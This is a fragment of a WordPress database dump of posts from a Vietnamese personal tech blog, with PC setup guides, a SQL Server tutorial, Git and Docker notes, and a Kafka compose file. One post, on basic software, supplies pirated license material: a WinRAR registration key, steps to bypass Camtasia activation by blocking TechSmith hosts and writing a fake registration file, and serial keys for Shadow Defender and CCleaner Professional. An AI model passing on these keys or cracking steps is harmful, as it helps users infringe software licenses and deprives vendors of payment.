rel=\"noopener\" target=\"_blank\">https://support.hp.com/us-en/drivers/selfservice/hp-probook-6460b-notebook-pc/5045594</a>\r\n- LAN - x32x64: <a href=\"https://ftp.hp.com/pub/softpaq/sp60501-61000/sp60775.exe\" target=\"_blank\" rel=\"noopener noreferrer\">https://ftp.hp.com/pub/softpaq/sp60501-61000/sp60775.exe</a>\r\n- Wifi - x32x64: <a href=\"https://ftp.hp.com/pub/softpaq/sp58501-59000/sp58782.exe\" target=\"_blank\" rel=\"noopener noreferrer\">https://ftp.hp.com/pub/softpaq/sp58501-59000/sp58782.exe</a>\r\n- Graphics x32: <a href=\"https://ftp.hp.com/pub/softpaq/sp64501-65000/sp64729.exe\" rel=\"noopener\" target=\"_blank\">https://ftp.hp.com/pub/softpaq/sp64501-65000/sp64729.exe</a>\r\n- Graphics x64: <a href=\"https://ftp.hp.com/pub/softpaq/sp64501-65000/sp64730.exe\" rel=\"noopener\" target=\"_blank\">https://ftp.hp.com/pub/softpaq/sp64501-65000/sp64730.exe</a>', 'Cài một máy tính hoàn chỉnh - P1: Cài Windows,Ghost và Office', '', 'publish', 'open', 'open', '', 'cai-mot-may-tinh-hoan-chinh-p1-cai-windowsghost-va-office', '', '', '2022-04-16 19:04:53', '2022-04-16 19:04:53', '', 0, 'https://duycode.com/?p=38', 0, 'post', '', 0),
(40, 1, '2019-08-20 21:44:52', '2019-08-20 21:44:52', '<h1>I. Văn phòng</h1>\n<h2>1. Unikey</h2>\n<img src=\"http://unikey.vn/vietnam/xmedia/images/screenshots/unikey.png\" alt=\"\" />\n- Unikey: <a href=\"https://www.unikey.org/download.html\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.unikey.org/download.html</a>\n<h2>2. Winrar</h2>\n- Download: <a href=\"http://www.rarlab.com/download.htm\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.rarlab.com/download.htm</a>\n- Key: Copy đoạn code sau lưu thành rarreg.key -&gt; ném trực tiếp vào 1 file nén bất kỳ là có thể reg key\n<blockquote>RAR registration data\nvietdl.net\nUnlimited Company License\nUID=27996101676cd47a3408\n64122122503408785285aa25406547e8b2de90024a7ef9597f9509\nf8b02c2d41b5d476c3c160fce6cb5ffde62890079861be57638717\n7131ced835ed65cc743d9777f2ea71a8e32c7e593cf66794343565\nb41bcf56929486b8bcdac33d50ecf7739960f8d36f2d4a1b6c1140\n7f4c63970973c98d63fcf230483f49411bae352864e73010b9b19b\n90f0f547020c9652779e231a7964866eca24577c7ddeab9360b4e9\n04efebd231ed54defe7296b7f8e4dc67fcd9cec098ce1236753878</blockquote>\n<h2>3. Net Framework 4.5 Full:</h2>\n- Tìm link download: <a href=\"https://docs.microsoft.com/en-us/dotnet/framework/install/guide-for-developers\">https://docs.microsoft.com/en-us/dotnet/framework/install/guide-for-developers</a>\n<h2>4. Chrome:</h2>\n- Download: <a href=\"https://www.google.com/intl/vi_ALL/chrome/\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.google.com/intl/vi_ALL/chrome/</a>\n<h2>5. Foxit Reader:</h2>\n- Download: <a href=\"https://www.foxitsoftware.com/products/pdf-reader/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.foxitsoftware.com/products/pdf-reader/</a>\n\n<h1>II. Media</h1>\n<h2>1. K-Lite Codec Pack</h2>\n- Download: <a href=\"https://www.codecguide.com/download_kl.htm\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.codecguide.com/download_kl.htm</a>\n<h2>2. Camtasia</h2>\n<h3>2.1. Download:</h3>\nhttp://download.techsmith.com/camtasiastudio/enu/camtasia.exe\nhttps://www.techsmith.com/download-camtasia-studio-thankyou.html\n<h3>2.2. Active:</h3>\n- Vào: C:\\Windows\\System32\\drivers\\etc tìm file host\n- Điền thêm vào file host:\n<blockquote>127.0.0.1 activation.cloud.techsmith.com\n127.0.0.1 oscount.techsmith.com\n127.0.0.1 updater.techsmith.com\n127.0.0.1 camtasiatudi.techsmith.com\n127.0.0.1 tsccloud.cloudapp.net\n127.0.0.1 assets.cloud.techsmith.com</blockquote>\n- Vào: C:\\ProgramData\\TechSmith\\Camtasia Studio 8 tìm file RegInfo.ini\n- Sửa file RegInfo.ini thành như sau:\n<blockquote>[RegistrationInfo]\nRegisteredTo=Nothing1010\nRegistrationKey=E5CUV-SCNDU-54GCC-CDC2T-AMEDM\nValidationData1=1\nValidationData2=1\nValidationData3=1\nValidationData4=1\nValidationData5=1</blockquote>\n- Để file RegInfo.ini ở chế độ: Read Only\n- Xong...\n\n<h1>III. Bảo mật</h1>\n<h2>1. Phần mềm diệt Virus</h2>\n<h3>1.1. Avast</h3>\n- Homepage: <a href=\"https://www.avast.com/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.avast.com/</a>\n<h2>2. Shadow Defender</h2>\n- Download: <a href=\"http://www.shadowdefender.com/download.html\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.shadowdefender.com/download.html</a>\n- Key bản Shadow Defender 1.4.0.648:\n<blockquote>753QA-XQGM5-U6MMQ-CG0CK-2HTDW\n6CS8H-E2VQD-6UANE-97Q0Z-ANB8G\nJGMDD-QBR9P-JQPZK-K914G-357ZU\n</blockquote>\n<h1>IV. Ứng dụng</h1>\n<h2>1. SlavaSoft HashCalc</h2>\n- Download: <a href=\"http://www.slavasoft.com/hashcalc/\" rel=\"noopener noreferrer\" target=\"_blank\">http://www.slavasoft.com/hashcalc/</a>\n<h2>2. CCleaner Professional</h2>\n- Download: <a href=\"https://www.piriform.com/ccleaner/download\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.piriform.com/ccleaner/download</a>\n- Key v5.21.5700 (nhớ ngắt mạng khi điền key)\n<blockquote>C2YW-T25N-8ZMR-EDHM-SZPC\nC2YW-HWGQ-KVCA-IMHC-YZPC\nC2YW-QQYR-HNBQ-3Y8H-YZPC\n</blockquote>\n<h2>3. FFSJ</h2>\n- Download: <a href=\"http://www.fastfilejoiner.com/\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.fastfilejoiner.com/</a>\n<h2>4. CPUID CPU-Z</h2>\n- Download: <a href=\"http://www.cpuid.com/softwares/cpu-z.html\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.cpuid.com/softwares/cpu-z.html</a>\n', 'Cài một máy tính hoàn chỉnh – P2: Các phần mềm cơ bản', '', 'publish', 'open', 'open', '', 'cai-mot-may-tinh-hoan-chinh-p2-cac-phan-mem-co-ban', '', '', '2019-08-20 21:44:52', '2019-08-20 21:44:52', '', 0, 'https://duycode.com/?p=40', 0, 'post', '', 0),
(53, 1, '2019-08-21 01:26:44', '2019-08-21 01:26:44', 'Ngôn ngữ truy vấn SQL có các thành phần chính: \n- Ngôn ngữ Thao tác Dữ liệu - Data Manipulation Language (DML)\n- Ngôn ngữ Định nghĩa Dữ liệu - Data Definition Language (DDL)\n- Ngôn ngữ Kiểm soát Dữ liệu - Data Control Language (DCL)\n- Data Query Language (DQL)\n\n<img src=\"https://img1.daumcdn.net/thumb/R800x0/?scode=mtistory2&fname=https%3A%2F%2Ft1.daumcdn.net%2Fcfile%2Ftistory%2F99923F3B5B05D4712E\" alt=\"\" />\n', 'SQL Server cơ bản', '', 'publish', 'open', 'open', '', 'sql-co-ban', '', '', '2019-08-21 01:26:44', '2019-08-21 01:26:44', '', 0, 'https://duycode.com/?p=53', 0, 'post', '', 0),
(55, 1, '2021-09-01 01:00:53', '2021-08-31 18:00:53', '<h2>1. Cài đặt Git</h2>\r\n* Download và cài đặt Git-scm\r\n<a href=\"https://git-scm.com/\" rel=\"noopener\" target=\"_blank\">https://git-scm.com/</a>\r\n<img src=\"https://git-scm.com/images/logo@2x.png\" alt=\"\" />\r\n<h2>2. Git status Lifecycle</h2>\r\n<pre>                                              \r\n              (1)                       (3)                                                  \r\nUntracked --------------► Staged --------------► first Commit (41ab78e) ====== Unmodified ---►┐ \r\n                                                                                              │\r\n                                                                                              │ \r\n                                                            (4)                               │\r\n                         Modified ◄-----------------------------------------------------------│\r\n                            │                                                                 │  \r\n                         (2)│                                                                 │  \r\n                            │                                                                 │              \r\n              (1)           ▼         (3)                                                     │   \r\nUntracked --------------► Staged --------------► new Commit (2a64238) ===== Unmodified ------►│ \r\n                                                                                              │\r\n                                                                                              │ \r\n                                                            (4)                               │\r\n                         Modified ◄-----------------------------------------------------------│\r\n                            │                                                                 │  \r\n                         (2)│                                                                 │  \r\n                            │                                                                 │              \r\n              (1)           ▼         (3)                                                     │ \r\nUntracked --------------► Staged --------------► new Commit (2a64238) ===== Unmodified ------►│ \r\n                                                                                              │\r\n\r\n\r\n// Có 4 trạng thái của File: Untracked, Modified và Staged, và Unmodified \r\n// Trạng thái Untracked, Modified và Staged: chỉ lưu 1 phiên bản của 1 file ==> Nếu cùng 1 file đi vào trạng thái đó thì sẽ bị ghi đè\r\n// Trạng thái Unmodified là trạng thái Commit --> có thể lưu nhiều phiên bản\r\n</pre>\r\n\r\n<pre>\r\n// Kiểm tra trạng thái file\r\ngit status \r\ngit log --oneline --graph --all -10\r\n\r\ngit add src/index.js                          (1) (2)\r\nget commit -m \"add function xyz\"              (3)\r\ngit restore --stage src/index.js              (-1) (-2)\r\ngit restore src/index.js                      (-4) \r\n\r\n// Đưa về trạng thái commit \"2a64238\" trước đó\r\n// Xóa tất cả các file làm việc, đưa hoàn toàn project về trạng thái đó\r\ngit reset --hard 2a64238                      (5)\r\n\r\n// Đưa về trạng thái commit \"2a64238\" trước đó\r\n// Các file đang làm việc được giữ và đưa về trạng thái \"Staging\" sau commit 2a64238 \r\ngit reset --soft 2a64238                      \r\n\r\n// Đưa về trạng thái commit \"2a64238\" trước đó\r\n// Các file đang làm việc được giữ và đưa về trạng thái \"Working\" sau commit 2a64238 \r\ngit reset --mixed 2a64238                      \r\n</pre>\r\n\r\n<h2> 3. Remote</h2>\r\n<pre>\r\n//Xem các remote đang sử dụng\r\ngit remote\r\ngit remote -v\r\n\r\n//Tạo một remote mới với kèm theo tên. VD: github với tên origin\r\ngit remote add <name> <url>\r\ngit remote add origin https://github.com/duycode/myproject.git\r\ngit remote add second https://github.com/paulboone/ticgit.git\r\n\r\n//Xóa một remote. VD: xóa remote origin\r\ngit remote remove <name>\r\ngit remote remove origin \r\n\r\n//Push code lên git (sau khi add và commit)\r\ngit push <name> <branch>\r\ngit push origin master\r\n</pre>\r\n\r\n<h2>. 4. Reflog</h2>\r\n<pre>\r\ngit reflog --format=\'%C(auto)%h %<|(10)%gd %C(blue)%cr%C(reset) %gs (%s)\'\r\n</pre>\r\n\r\n', 'Git cơ bản - 1. Làm việc trên Local', '', 'publish', 'open', 'open', '', 'git-co-ban-1-lam-viec-tren-local', '', '', '2022-11-30 11:19:24', '2022-11-30 11:19:24', '', 0, 'https://duycode.com/?p=55', 0, 'post', '', 0),
(62, 1, '2019-08-27 15:22:03', '2019-08-27 15:22:03', '<h2>I. Các trình soạn thảo code</h2>\n<h3>1. JAVA</h3>\n<h4>1.1. JDK</h4>\n- Download: <a href=\"https://www.oracle.com/java/technologies/javase-downloads.html\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.oracle.com/java/technologies/javase-downloads.html</a>\n*** Cài đặt JDK: My Computer -> Properties -> Advanced system settings -> Advanced -> Environment Variablles\n- Tại System variables -> New: \n + Variable name: JAVA_HOME\n + Variable value: C:\\Program Files\\Java\\jdk-14.0.1\n- Tại System variables -> Variable \"Path\" -> Edit\n + Sửa thành dòng \"%JAVA_HOME%\\bin\" trước dòng \"C:\\Windows\\system32\"\n\n<h4>1.2. Eclipse</h4>\n- Download: <a href=\"https://www.eclipse.org/downloads/packages/\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.eclipse.org/downloads/packages/</a>\n- Tải phiên bản: Eclipse IDE for Enterprise Java Developers\n<h3>3. JetBrain</h3>\n- Webstorm: <a href=\"https://www.jetbrains.com/webstorm/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.jetbrains.com/webstorm/</a>\n- DataGrip: <a href=\"https://www.jetbrains.com/datagrip/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.jetbrains.com/datagrip/</a>\n- IntelliJ IDA: <a href=\"https://www.jetbrains.com/idea/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.jetbrains.com/idea/</a>\n- Rider: <a href=\"https://www.jetbrains.com/rider/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.jetbrains.com/rider/</a>\n<h3>4.Local Server</h3>\n- XAMPP: https://www.apachefriends.org/download.html\n<h3>5. Dev-C ++</h3>\n- Download: <a href=\"https://sourceforge.net/projects/orwelldevcpp/\" target=\"_blank\" rel=\"noopener noreferrer\">https://sourceforge.net/projects/orwelldevcpp/</a>\n<h2>II. Các plugin bắt buộc</h2>\n<h3>1. Git</h3>\n- Link: https://git-scm.com/downloads\n- Github Desktop: https://desktop.github.com/\n<h2>III. Các tiện ích khác</h2>\n<h3>1. Notepad++</h3>\n<img src=\"https://notepad-plus-plus.org/assets/images/notepad4ever.gif\" alt=\"\" />\n- Homepage: <a href=\"https://notepad-plus-plus.org/\" target=\"_blank\" rel=\"noopener noreferrer\">https://notepad-plus-plus.org/</a>\n<h3>2. Wordpress</h3>\n- Download: <a href=\"https://wordpress.org/download/\" target=\"_blank\" rel=\"noopener noreferrer\">https://wordpress.org/download/</a>\n<h3>4. Appserv</h3>\n- Download: <a href=\"https://www.appservnetwork.com/en/download/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.appservnetwork.com/en/download/</a>\n\nNodeJS\nHeroku\nPhotoShop\nSQL Server Management Studio\n\n<h2>III. Các tiện ích khác</h2>\n<h3>1. StarUML</h3>\n<a href=\"http://staruml.io/\">http://staruml.io/</a>', 'Cài một máy tính hoàn chỉnh – P3: Các phần mềm cho Coder', '', 'publish', 'open', 'open', '', 'cai-mot-may-tinh-hoan-chinh-p3-cac-phan-mem-cho-coder', '', '', '2019-08-27 15:22:03', '2019-08-27 15:22:03', '', 0, 'https://duycode.com/?p=62', 0, 'post', '', 0),
(66, 1, '2019-08-27 16:02:37', '2019-08-27 09:02:37', '<h3>Forward Port to other port</h3>\r\n<note>docker run --detach --publish 3300:27017 --link schat_database:target --net database_default alpine/socat tcp-listen:27017,fork,reuseaddr tcp-connect:target:27017\r\n</note>', 'Docker - note', '', 'publish', 'open', 'open', '', 'thu-thuat-mang-lan-co-ban', '', '', '2022-10-12 10:20:57', '2022-10-12 10:20:57', '', 0, 'https://duycode.com/?p=66', 0, 'post', '', 0),
(81, 1, '2019-09-15 02:00:47', '2019-09-15 02:00:47', '\r\n\r\n<table>\r\n    <thead>\r\n        <tr><th>Type</th><th>Name</th><th>Content</th></tr>\r\n    </thead>\r\n    <tbody>\r\n        <tr><td>A</td><td>duycode.com</td><td>103.28.36.171</td></tr>\r\n        <tr><td>CNAME</td><td>*</td><td>duycode.com</td></tr>\r\n    </tbody>\r\n</table>', 'SSL/TLS - Cài đặt TLS bằng Let\'s Encrypt và Nginx', '', 'publish', 'open', 'open', '', 'ssl-tls-cai-dat-tls-bang-lets-encrypt-va-nginx', '', '', '2022-10-29 01:58:12', '2022-10-29 01:58:12', '', 0, 'https://duycode.com/?p=81', 0, 'post', '', 0),
(84, 1, '2021-09-01 03:00:00', '2021-08-31 20:00:00', '<h2> I. Mỗi project một tài khoản GIT riêng</h2>\r\n- Kiểm tra tài khoản trên máy tính hiện tại:\r\n<pre>\r\ngit config --list\r\n# user.email=duycode.com@gmail.com\r\n# user.name=duycode-com\r\n# ...\r\n// Có thể xóa tài khoản Git trên window --> Run: \"Credential Manager\"\r\n</pre>\r\n\r\n- Cài đặt account GIT riêng : Vào repository/.git/config --> Thêm vào cuối\r\n\r\n<pre>\r\n[user]\r\n    name = duycode-com\r\n    email = duycode.com@gmail.com\r\n[credential \"https://github.com/duycode-com/mern-stack.git\"]\r\n    username = duycode-com  \r\n</pre>\r\n\r\n<h2>II. Một số lỗi nhỏ hay gặp</h2>\r\n<h3> 1. Fix lỗi CRLF</h3>\r\n<pre>\r\ngit config core.autocrlf false\r\n# git config --global core.autocrlf input\r\n\r\ngit rm --cached -r .\r\n\r\ngit reset --hard\r\n</pre>\r\n\r\n<h3> 2. Thêm file hoặc thư mục vào .gitignore không thành công</h3>\r\n- Lý do là file đó đã được theo dõi bởi git\r\n<pre>\r\n// Ví dụ xóa file .env\r\n// 1. Xóa theo dõi file bởi git\r\ngit reset .env\r\n\r\n// 2. Xóa trên git remote\r\ngit rm --cached .env\r\ngit add .\r\ngit commit -m \"update iggnore\"\r\ngit push github master\r\n</pre>\r\n\r\n- Đơn giản hơn, xóa sạch cache rồi commit lại\r\n<pre>\r\ngit rm -r --cached .\r\n// update .gitignore\r\ngit add .\r\ngit commit -m \"Update .gitignore\"\r\ngit push\r\n</pre>', 'Git cơ bản – 3. Config Git', '', 'publish', 'open', 'open', '', 'flex-co-ban', '', '', '2023-12-06 15:55:25', '2023-12-06 15:55:25', '', 0, 'https://duycode.com/?p=84', 0, 'post', '', 0),
(111, 1, '2019-10-01 23:05:13', '2019-10-01 23:05:13', 'Công ty CitySoftware cần lập 1 Databse bao gồm 4 bảng để quản lý dữ liệu bao gồm: Employee, GroupWork, GroupDetail, Project.\nTrong đó: 1 Employee có thể tham gia nhiều GroupWork, 1 GroupWork có nhiều Employee và 1 Project bao gồm nhiều GroupWork\n<img src=\"https://drive.google.com/uc?export=view&id=1dI_RDc6qvyMSAxtdx0tQLSckzNY9D0c4\"/>\n\n<h2>1. Tạo bảng: CREATE TABLE</h2>\n<pre>\nCREATE TABLE Project(\n	ProjectID int IDENTITY(1,1) PRIMARY KEY,\n	ProjectName Nvarchar(30),\n	StartDate date,\n	EndDate date,\n	Period int,\n	Cost money\n);\n\nCREATE TABLE GroupWork(\n	GroupID int IDENTITY(1,1) PRIMARY KEY,\n	GroupName varchar(30),\n	LeaderID int,\n	ProjectID int NOT NULL FOREIGN KEY REFERENCES Project(ProjectID)\n);\n\nCREATE TABLE Employee(\n	EmployeeID int IDENTITY(1,1) PRIMARY KEY,\n	Name varchar(100),\n	Tel char(10) UNIQUE,\n	Email varchar(30),\n	Birthday date,\n	CONSTRAINT check_birthday CHECK (Birthday < GETDATE())\n);\n\nCREATE TABLE GroupDetail(\n	GroupID int NOT NULL FOREIGN KEY REFERENCES GroupWork(GroupID),\n	EmployeeID int NOT NULL FOREIGN KEY REFERENCES Employee(EmployeeID),\n	Statusemployee Nvarchar(100)\n);\n</pre>\n\n<h2>2. Thêm dữ liệu cho bảng: INSERT TO\n<pre>\nINSERT INTO Project(ProjectName,StartDate,EndDate,Period,Cost)\n	VALUES (N\'Xây cầu vượt\',\'2020-01-02\',\'2020-12-15\',12,1000);\nINSERT INTO Project(ProjectName,StartDate,EndDate,Period,Cost)\n	VALUES (N\'Xây chung cư\',\'2015-05-10\',\'2018-09-20\',20,800);\nINSERT INTO Project\n	VALUES (N\'Chính phủ điện tử\',\'2018-02-15\',\'2022-09-15\',7,150150);\n\nINSERT INTO GroupWork(GroupName,LeaderID,ProjectID)\n	VALUES (\'Nhom ONE\',1,1);\nINSERT INTO GroupWork\n	VALUES (\'Nhom VIPPRO\',3,2);\nINSERT INTO GroupWork\n	VALUES (\'Nhom Nhanuoc\',4,3);\n\nINSERT INTO Employee(Name,Tel,Email)\n	VALUES (\'Nguyen van A\',\'0123456789\',\'nguyenvana@gmail.com\');\nINSERT INTO Employee(Name,Tel,Email)\n	VALUES (\'Tran thi B\',\'0987111222\',\'tranthib@gmail.com\');\nINSERT INTO Employee(Name,Tel,Email)\n	VALUES (\'Do Hong C\',\'0123412345\',\'dohongc@gmail.com\');\nINSERT INTO Employee(Name,Tel,Email)\n	VALUES (\'Ngo Van D\',\'0986021190\',\'duyhn90a@gmail.com\');\nINSERT INTO Employee(Name,Tel,Email)\n	VALUES (\'Bui Thi Tr\',\'0968100994\',\'buitrang@gmail.com\');\n\nINSERT INTO GroupDetail(GroupID,EmployeeID,Statusemployee)\n	VALUES (1,1,N\'đã làm\');\nINSERT INTO GroupDetail\n	VALUES (1,3,N\'đang làm\');\nINSERT INTO GroupDetail\n	VALUES (2,2,N\'sắp làm\');\nINSERT INTO GroupDetail\n	VALUES (2,4,N\'đang làm\');\nINSERT INTO GroupDetail\n	VALUES (2,3,N\'đang làm\');\nINSERT INTO GroupDetail\n	VALUES (3,4,N\'đang làm\');\nINSERT INTO GroupDetail\n	VALUES (3,5,N\'sắp làm\');\n</pre>\n\n<h2>3. Thao tác định nghĩa dữ liệu - DDL Command</h2>\n<pre>\n-- 3.a. Sửa cột, thêm cột, xóa cột ( phải xóa constraint trước)\nALTER TABLE EMployee ALTER COLUMN Name Nvarchar(50);\nALTER TABLE Employee ADD IdentityCard int NOT NULL DEFAULT(10000);\nALTER TABLE Employee DROP CONSTRAINT check_birthday;\nALTER TABLE Employee DROP COLUMN Birthday;\n\n-- 3.b. Ngày hoàn thành dự án phải sau ngày bắt đầu dự án\nALTER TABLE Project ADD CHECK (EndDate > StartDate);\n\n-- 3.c. Trường trạng thái làm việc chỉ nhận 1 trong 3 trạng thái: inprogress, pending, done\nALTER TABLE GroupDetail ADD CHECK (GroupDetail.Statusemployee IN (N\'đã làm\',N\'đang làm\',N\'sắp làm\'));\n\n-- 3.d. Điện thoại chỉ được nhập số và bắt đầu bằng số 0, Email có định dạng @.\nALTER TABLE Employee ADD CONSTRAINT check_tel CHECK (Tel LIKE \'0%\' AND Tel NOT LIKE \'%[^0-9]%\');\nALTER TABLE Employee ADD CHECK(Email LIKE \'%_@_%._%\');\n\n-- 3.e. Trưởng nhóm (LeaderID) phải là nhân viên (EmployeeID)\nIF OBJECT_ID(\'dbo.Check_LeaderID\') IS NOT NULL\n	DROP FUNCTION Check_LeaderID; \nGO\nCREATE FUNCTION Check_LeaderID (@ckLeaderID int)\nRETURNS int AS\nBEGIN\n	IF EXISTS (SELECT EmployeeID From Employee WHERE EmployeeID = @ckLeaderID)\n        RETURN 1\n	RETURN 0\nEND;\nGO\nALTER TABLE GroupWork ADD CONSTRAINT check_constraint_LeaderID CHECK (dbo.Check_LeaderID(LeaderID) = 1);\n\n</pre>\n\n<h2>4. Thao tác dữ liệu - DML Command</h2>\n<pre>\n-- 4.a. Xóa bảng GroupDetail và xóa Employee \'Ngo Van D\'\nDELETE FROM GroupDetail;\nDELETE FROM Employee WHERE Name LIKE \'Ngo Van D\';\n-- 4.b. Update EmployeeID = 5 với Name = \'Bui Thi Trang\', Email = \'drtrang@gmail.com\'\nUPDATE Employee\nSET Name = \'Bui Thi Trang\', Email = \'drtrang@gmail.com\'\nWHERE EmployeeID = 5;\n</pre>\n\n<h2>5. Câu lệnh truy vấn: SELECT</h2>\n<pre>\n-- 5.a. Xem danh sách tất cả nhân viên\nSELECT * FROM Employee\n	ORDER BY EmployeeID ASC;\n-- 5.b. Liệt kê danh sách nhân viên đang làm dự án \"chính phủ điện tử\"\nSELECT Employee.*,Project.ProjectName FROM Employee\n	LEFT JOIN GroupDetail ON Employee.EmployeeID = GroupDetail.EmployeeID \n	LEFT JOIN GroupWork ON GroupDetail.GroupID = GroupWork.GroupID\n	LEFT JOIN Project ON GroupWork.ProjectID = Project.ProjectID\n	WHERE (ProjectName LIKE N\'Chính phủ điện tử\');\n\n-- 5.c. Thống kê số nhân viên \"đang làm việc\" tại mỗi nhóm\nSELECT GroupWork.GroupName, COUNT(GroupDetail.EmployeeID) FROM GroupWork\n	LEFT JOIN GroupDetail ON GroupWork.GroupID = GroupDetail.GroupID\n	WHERE Statusemployee LIKE N\'đang làm\'\n	GROUP BY GroupName;\n</pre>\n\n<h2>6. Khung nhìn: VIEW</h2>\n<pre>\n-- 6.a. Tạo khung nhìn all_information: Liệt kê thông tin về nhân viên, nhóm làm việc có dự án đang thực hiện\nCREATE VIEW all_information\nAS\nSELECT GroupWork.GroupName,Employee.Name,Project.ProjectName,Project.StartDate,Project.EndDate FROM Employee\n	FULL JOIN GroupDetail ON Employee.EmployeeID = GroupDetail.EmployeeID\n	FULL JOIN GroupWork ON GroupDetail.GroupID = GroupWork.GroupID\n	FULL JOIN Project ON GroupWork.ProjectID = Project.ProjectID\n	WHERE Project.StartDate < GETDATE() AND Project.EndDate > GETDATE();\nGO\nSELECT * FROM all_information;\n\n-- 6.b. Sửa khung nhìn all_information \nALTER VIEW all_information\nAS\nSELECT Employee.Name,GroupWork.GroupName,Project.ProjectName,Project.StartDate,Project.EndDate FROM Employee\n	FULL JOIN GroupDetail ON Employee.EmployeeID = GroupDetail.EmployeeID\n	FULL JOIN GroupWork ON GroupDetail.GroupID = GroupWork.GroupID\n	FULL JOIN Project ON GroupWork.ProjectID = Project.ProjectID\n	WHERE Project.StartDate < GETDATE() AND Project.EndDate > GETDATE();\nGO\nSELECT * FROM all_information;\n\n-- 6.c. Xóa khung nhìn all_information\nDROP VIEW dbo.all_information;\nGO\n</pre>\n\n\n<h2>7. Tạo chỉ mục: INDEX</h2>\n<pre>\n-- a. Tạo chỉ mục duy nhất tên là IX_Group trên 2 trường GroupID và EmployeeID của bảng GroupDetail\nDROP INDEX GroupDetail.IX_Group\nCREATE UNIQUE INDEX IX_Group ON GroupDetail(GroupID,EmployeeID);\n\n-- b. Tạo chỉ mục tên là IX_Project trên trường ProjectName của bảng Project gồm các trường StartDate và EndDate\nDROP INDEX Project.IX_Project\nCREATE INDEX IX_Project ON Project(StartDate,EndDate);\n</pre>\n\n<h2>8. Tạo các thủ tục lưu trữ: PROCEDURE</h2>\n<pre>\n-- a. Tăng giá thêm 10% các dự án có giá trị nhỏ hơn 2000\nDROP PROCEDURE Project_UpdateCost;\nCREATE PROCEDURE Project_UpdateCost \nAS BEGIN\nUPDATE Project\n	SET Cost = (Cost*1.1)\n	WHERE Cost < 2000;\nEND;\nEXEC Project_UpdateCost;\n\n-- b. Hiển thị thông tin về dự án sắp được thực hiện\nDROP PROCEDURE Project_near;\nCREATE PROCEDURE Project_near\nAS BEGIN\nSELECT * FROM Project WHERE StartDate > GETDATE()\nEND;\nEXEC Project_near;\n\n-- c. Hiển thị thông tin liên quan về các dự án đã hoàn thành\nDROP PROCEDURE Project_done\nCREATE PROCEDURE Project_done\nAS\nSELECT * FROM Project\n	LEFT JOIN GroupWork ON Project.ProjectID = GroupWork.ProjectID\n	LEFT JOIN GroupDetail ON GroupWork.GroupID = GroupDetail.GroupID\n	LEFT JOIN Employee ON GroupDetail.EmployeeID = Employee.EmployeeID\n	WHERE EndDate < GETDATE()\nGO;\nEXEC Project_done;\n</pre>\n<h2>9. Tạo Trigger</h2>\n<pre>\na. Khi trường EndDate được cập nhậtthì tự động tính toán tổng thời gian hoàn thành dự án và cập nhật vào trường Period\nb. Đảm bảo rằng khi xóa một Group thì tất cả những bản ghi có liên quan trong bảng GroupDetail cũng sẽ bị xóa theo.\nc. Không cho phép chèn 2 nhóm có cùng tên vào trong bảng Group.\n</pre>', 'SQL Server - Ứng dụng vào một Project thực tế', '', 'publish', 'open', 'open', '', 'sql-server-ung-dung-vao-mot-project-thuc-te', '', '', '2019-10-01 23:05:13', '2019-10-01 23:05:13', '', 0, 'https://duycode.com/?p=111', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(138, 1, '2023-06-01 02:00:31', '2023-06-01 02:00:31', '<pre>\r\nversion: \"3.3\"\r\n\r\nnetworks:\r\n  mh_network:\r\n    driver: bridge\r\n\r\nservices:\r\n  zookeeper:\r\n    container_name: mhc_zookeeper\r\n    image: \"bitnami/zookeeper:3.6.4\"\r\n    networks:\r\n      - mh_network\r\n    ports:\r\n      - \"2181:2181\"\r\n    environment:\r\n      - ALLOW_ANONYMOUS_LOGIN=yes\r\n\r\n  kafka:\r\n    container_name: mhc_kafka\r\n    image: \"bitnami/kafka:3.3.2\"\r\n    networks:\r\n      - mh_network\r\n    depends_on:\r\n      - zookeeper\r\n    # volumes:\r\n    #   - ./data/kafka:/bitnami/kafka\r\n    ports:\r\n      - \"9092:9092\"\r\n      - \"9093:9093\"\r\n    environment:\r\n      - KAFKA_CFG_ZOOKEEPER_CONNECT=zookeeper:2181\r\n      - ALLOW_PLAINTEXT_LISTENER=yes\r\n      - KAFKA_BROKER_ID=1\r\n      - KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP=CLIENT:PLAINTEXT,EXTERNAL:PLAINTEXT\r\n      - KAFKA_CFG_LISTENERS=CLIENT://:9092,EXTERNAL://:9093\r\n      - KAFKA_CFG_ADVERTISED_LISTENERS=CLIENT://kafka:9092,EXTERNAL://localhost:9093\r\n      - KAFKA_CFG_INTER_BROKER_LISTENER_NAME=CLIENT\r\n\r\n  kafka-ui:\r\n    container_name: mhc_kafka-ui\r\n    image: provectuslabs/kafka-ui\r\n    depends_on:\r\n      - kafka\r\n    networks:\r\n      - mh_network\r\n    ports:\r\n      - \"9090:8080\"\r\n    restart: unless-stopped\r\n    environment:\r\n      - KAFKA_CLUSTERS_0_NAME=local\r\n      - KAFKA_CLUSTERS_0_BOOTSTRAPSERVERS=kafka:9092\r\n\r\n</pre>', 'docker-compose: Kafka', '', 'publish', 'open', 'open', '', 'docker-compose-kafka', '', '', '2023-07-06 03:46:00', '2023-07-06 03:46:00', '', 0, 'https://duycode.com/?p=138', 0, 'post', '', 0),
